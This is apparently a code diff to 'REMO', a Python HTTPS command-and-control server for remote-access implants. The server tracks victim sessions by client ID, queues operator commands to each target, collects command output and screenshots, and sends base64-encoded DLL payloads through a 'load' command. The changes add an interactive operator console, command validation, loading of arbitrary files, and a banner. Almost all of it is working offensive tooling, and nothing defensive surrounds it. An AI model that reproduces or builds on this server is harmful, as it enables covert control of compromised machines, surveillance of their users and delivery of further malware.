@@ -5,15 +5,14 @@ import queue
 import logging
 import zlib
 import base64
-import sys
+import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 # Globals to keep track of sessions and session data
-sessions          = {}
-session_queues    = {}
-session_commands  = {}
-previous_commands = {}
-selected_session = None
+sessions          = {'0':0}
+session_queues    = {'0':queue.Queue()}
+session_commands  = {'0':[]}
+selected_session = '0'
 
 def bmp(data):
     d = json.loads(data)
@@ -31,7 +30,6 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         global sessions
         global session_queues
         global session_commands
-        global previous_commands
         
         clientid = self.headers.get("clientid")
         commands = self.headers.get("Commands")
@@ -43,14 +41,13 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
         response = b""
         # Got back a response from a command
         if (received != b"none"):
-            #cmd = previous_commands[clientid].get()
-            cmd = command
-            print("[ {} ]".format(cmd[:256]))
-            if cmd.startswith("screenshot"):
+            print("[ {} ]".format(command))
+            if command.startswith("screenshot"):
+                print("Received screenshot!")
                 bmp(received)
-            print(str(received)[:100])
-            #for line in str(received)[2:-1].split("\\n"):
-            #    print(line)
+            else:
+                for line in str(received)[2:-1].split("\\n"):
+                    print(line)
 
         if clientid:
             if clientid not in sessions:
@@ -58,7 +55,6 @@ class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
                 sessions[clientid] = 0
                 session_queues[clientid] = queue.Queue()
                 session_commands[clientid] = commands.split() if commands else []
-                previous_commands[clientid] = queue.Queue()
            
             sessions[clientid] += 1
             session_commands[clientid] = commands.split() if commands else []
@@ -82,56 +78,74 @@ def run_server(server_class=HTTPServer, handler_class=CustomHTTPRequestHandler, 
     httpd = server_class(server_address, handler_class)
     
     # Load SSL context
-    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
+    #httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain("cert.pem",keyfile="key.pem")
+    httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)
     
     print(f'Serving HTTPS on port {port}...')
     httpd.serve_forever()
 
 def user_interface():
     global selected_session
+    global session_commands
+    global session_queues
     
     while True:
-        if selected_session:
-            print(f'Selected session: {selected_session}')
-            print("Available commands: bg (background)", session_commands[selected_session])
-            print("Queued commands:")
+        display_block  = "\n[ === === === REMO === === === ]\n"
+        if selected_session != '0':
+            display_block += "[  bg|background, " + ', '.join(session_commands[selected_session]) + "\n"
+            display_block += "[ Queued for target:\n"
             with session_queues[selected_session].mutex:
                 for i,item in enumerate(list(session_queues[selected_session].queue)):
-                    print(i, item)
-
-            command = input("[{}]> ".format(selected_session))
-            
-            if command in ['bg', 'background']:
-                selected_session = None
-            elif len(command.strip()) < 2:
-                pass
-            else:
-                if "LOADTEST" in command:
-                    with open("screenshot.dll", "rb") as f:
-                        data = f.read()
-                    command = "load " + base64.b64encode(data).decode()
-                session_queues[selected_session].put(command)
-                previous_commands[selected_session].put(command)
-                print(f'Queued data for session {selected_session}.')
+                    display_block += f"[  <{i}> {item}\n"
         else:
-            print("Current sessions:", sessions.keys())
-            print("Commands available:")
-            print("  select <clientid>")
-            print("  exit")
-            command = input("[]> ")
-            
-            if command.startswith('select '):
-                clientid = command.split(' ')[1]
-                if clientid in sessions:
-                    selected_session = clientid
-                else:
-                    print(f'[!] Session {clientid} does not exist.')
-            elif command == 'exit':
-                break
+            display_block += "[ Available sessions:\n"
+            for i in range(0, len(sessions.keys()), 3):
+                display_block += "[    " + ' '.join(list(sessions.keys())[i:i+3]) + "\n"
+            display_block += "[ Commands:\n"
+            display_block += "[  select <clientid>\n"
+            display_block += "[  exit\n"
+
+        display_block += "[{}]> ".format(selected_session if selected_session != '0' else "no session")
+        command = input(display_block)
+
+        # builtin commands            
+        if command in ['bg', 'background']:
+            selected_session = '0'
+        elif command.startswith('select'):
+            clientid = command.split(' ')[1]
+            if clientid in sessions:
+                selected_session = clientid
+            else:
+                print(f'[!] Session {clientid} does not exist.')
+        elif command == 'exit':
+            return
+        # invalid commands
+        elif len(command.strip()) < 2:
+            pass
+        # Valid command to send to target
+        elif command.split()[0].strip() in session_commands[selected_session]:
+            if command.startswith("load"):
+                file = command.split()[-1]
+                with open(file, "rb") as f:
+                    data = f.read()
+                command = "load " + base64.b64encode(data).decode()
+            session_queues[selected_session].put(command)
+            print(f'Queued data for session {selected_session}.')
+
 
 if __name__ == "__main__":
+    print(""" _______    ________ ____    ____   ___    
+|_   __ \  |_   __  |_   \  /   _|.'   `.  
+  | |__) |   | |_ \_| |   \/   | /  .-.  \ 
+  |  __ /    |  _| _  | |\  /| | | |   | | 
+ _| |  \ \_ _| |__/ |_| |_\/_| |_\  `-'  / 
+|____| |___|________|_____||_____|`.___.'  
+                                           """)
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
     
+    time.sleep(1) # Let the server startup before presenting interface
     user_interface()
